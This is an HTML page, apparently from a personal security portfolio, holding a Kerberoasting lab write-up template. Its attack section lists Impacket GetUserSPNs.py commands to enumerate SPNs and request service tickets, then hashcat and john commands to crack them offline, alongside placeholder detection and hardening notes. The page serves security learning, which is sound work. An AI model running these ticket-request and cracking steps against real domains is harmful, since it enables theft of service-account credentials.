@@ -1,0 +1,191 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Active Directory Kerberoasting notes template" />
+  <title>AD — Kerberoasting Notes | Write-ups</title>
+
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../../style.css" />
+
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem("portfolio-theme");
+        if (!t) {
+          t = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+        }
+        document.documentElement.setAttribute("data-theme", t);
+      } catch (e) {}
+    })();
+  </script>
+</head>
+<body class="page-writeup">
+  <header class="mobile-header">
+    <button class="menu-toggle" id="menuToggle" aria-label="Mở menu" aria-expanded="false">
+      <span class="hamburger"></span>
+    </button>
+    <span class="mobile-title">AD Notes</span>
+    <button class="theme-toggle mobile-theme" id="themeToggleMobile" aria-label="Chuyển dark/light mode"></button>
+  </header>
+
+  <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-inner">
+      <div class="avatar-wrap">
+        <img class="avatar" src="https://api.dicebear.com/9.x/shapes/svg?seed=NguyenTruongBao&backgroundColor=0f1115" alt="Avatar" width="140" height="140" />
+      </div>
+      <h1 class="sidebar-name">Nguyễn Trường Bảo</h1>
+      <p class="sidebar-title">Cybersecurity × AI Engineer</p>
+      <p class="sidebar-bio">AD attack path notes — Kerberoasting lab template.</p>
+
+      <nav class="sidebar-nav" aria-label="Main navigation">
+        <a href="../../index.html#about" class="nav-link">About</a>
+        <a href="../../index.html#skills" class="nav-link">Skills</a>
+        <a href="../../index.html#certifications" class="nav-link">Certifications</a>
+        <a href="../index.html" class="nav-link active">Write-ups</a>
+        <a href="../../index.html#projects" class="nav-link">Projects</a>
+        <a href="../../index.html#contact" class="nav-link">Contact</a>
+      </nav>
+
+      <nav class="blog-side-cats" aria-label="Blog categories">
+        <p class="blog-side-cats-title">Categories</p>
+        <a href="../index.html?cat=all">All</a>
+        <a href="../index.html?cat=soc">SOC</a>
+        <a href="../index.html?cat=htb">HTB</a>
+        <a href="../index.html?cat=tryhackme">TryHackMe</a>
+        <a href="../index.html?cat=ad" class="is-active">AD</a>
+        <a href="../index.html?cat=footprinting">Footprinting</a>
+      </nav>
+
+      <button class="theme-toggle sidebar-theme" id="themeToggle" aria-label="Chuyển dark/light mode">
+        <span class="theme-icon" aria-hidden="true"></span>
+        <span class="theme-label">Dark mode</span>
+      </button>
+    </div>
+  </aside>
+
+  <main class="main-content writeup-main">
+    <article class="writeup-article">
+      <a class="writeup-back" href="../index.html?cat=ad">← Back to AD</a>
+
+      <header class="writeup-header">
+        <div class="writeup-meta-row">
+          <span class="cat-badge cat-ad">AD</span>
+          <span class="diff-badge diff-medium">Medium</span>
+          <time datetime="2026-01-10">Jan 10, 2026</time>
+        </div>
+        <h1 class="writeup-title">Kerberoasting Notes</h1>
+        <p class="writeup-lead">
+          Home-lab / Academy style notes: request service tickets, offline crack, and detection ideas.
+          Document the environment <em>you</em> built or were assigned.
+        </p>
+        <div class="post-tags writeup-tags">
+          <span class="tag tag-sm">Kerberos</span>
+          <span class="tag tag-sm">Impacket</span>
+          <span class="tag tag-sm">Detection</span>
+        </div>
+      </header>
+
+      <nav class="writeup-toc" aria-label="Table of contents">
+        <p class="writeup-toc-title">Contents</p>
+        <ol>
+          <li><a href="#concept">Concept</a></li>
+          <li><a href="#lab">Lab setup</a></li>
+          <li><a href="#attack">Attack steps</a></li>
+          <li><a href="#detection">Detection ideas</a></li>
+          <li><a href="#hardening">Hardening</a></li>
+          <li><a href="#lessons">Lessons learned</a></li>
+        </ol>
+      </nav>
+
+      <section id="concept" class="writeup-section">
+        <h2>Concept</h2>
+        <p>
+          <!-- PLACEHOLDER in your words -->
+          Kerberoasting targets service accounts with SPNs: request a TGS, extract the hash, crack offline.
+        </p>
+        <div class="callout callout-info">
+          <strong>MITRE:</strong> <!-- e.g. T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting -->
+        </div>
+      </section>
+
+      <section id="lab" class="writeup-section">
+        <h2>Lab setup</h2>
+        <div class="table-wrap">
+          <table class="writeup-table">
+            <tbody>
+              <tr><th>Domain</th><td><code><!-- corp.local --></code></td></tr>
+              <tr><th>DC</th><td><code><!-- 10.x.x.x --></code></td></tr>
+              <tr><th>User (low priv)</th><td><code><!-- user / pass --></code></td></tr>
+              <tr><th>Target SPN account</th><td><code><!-- sqlsvc --></code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <section id="attack" class="writeup-section">
+        <h2>Attack steps</h2>
+        <h3>1. Enumerate SPNs</h3>
+        <pre class="code-block"><code># PLACEHOLDER — Linux
+GetUserSPNs.py domain/user:pass -dc-ip &lt;dc-ip&gt;
+
+# Windows (example)
+# setspn -T domain -Q */*
+# or Rubeus / PowerView equivalents you used</code></pre>
+        <h3>2. Request TGS &amp; crack</h3>
+        <pre class="code-block"><code># PLACEHOLDER
+GetUserSPNs.py domain/user:pass -dc-ip &lt;dc-ip&gt; -request -outputfile tgs.hashes
+hashcat -m 13100 tgs.hashes /path/wordlist.txt
+# or john --format=krb5tgs ...</code></pre>
+        <figure class="writeup-figure">
+          <div class="img-placeholder">📷 Impacket / hashcat output screenshot</div>
+          <figcaption>Figure — ticket request / crack (placeholder)</figcaption>
+        </figure>
+      </section>
+
+      <section id="detection" class="writeup-section">
+        <h2>Detection ideas</h2>
+        <ul>
+          <li><!-- Unusual TGS requests for many SPNs --></li>
+          <li><!-- Encryption type anomalies --></li>
+          <li><!-- Correlated logon after cracked service account use --></li>
+        </ul>
+      </section>
+
+      <section id="hardening" class="writeup-section">
+        <h2>Hardening</h2>
+        <ul>
+          <li>Long, random passwords for service accounts (or gMSA)</li>
+          <li><!-- AES only / disable weak etypes if applicable --></li>
+          <li><!-- Least privilege for SPN accounts --></li>
+        </ul>
+      </section>
+
+      <section id="lessons" class="writeup-section">
+        <h2>Lessons learned</h2>
+        <ul>
+          <li><!-- Tooling pitfalls (clock skew, DNS) --></li>
+          <li><!-- Next AD technique to practice --></li>
+        </ul>
+      </section>
+
+      <footer class="writeup-footer">
+        <a class="writeup-back" href="../index.html?cat=ad">← Back to AD</a>
+        <p class="writeup-disclaimer">Template only — document your own lab path.</p>
+      </footer>
+    </article>
+
+    <footer class="site-footer">
+      <p>© <span id="year"></span> Nguyễn Trường Bảo · Cybersecurity × AI Engineer.</p>
+    </footer>
+  </main>
+
+  <script src="../../script.js"></script>
+</body>
+</html>
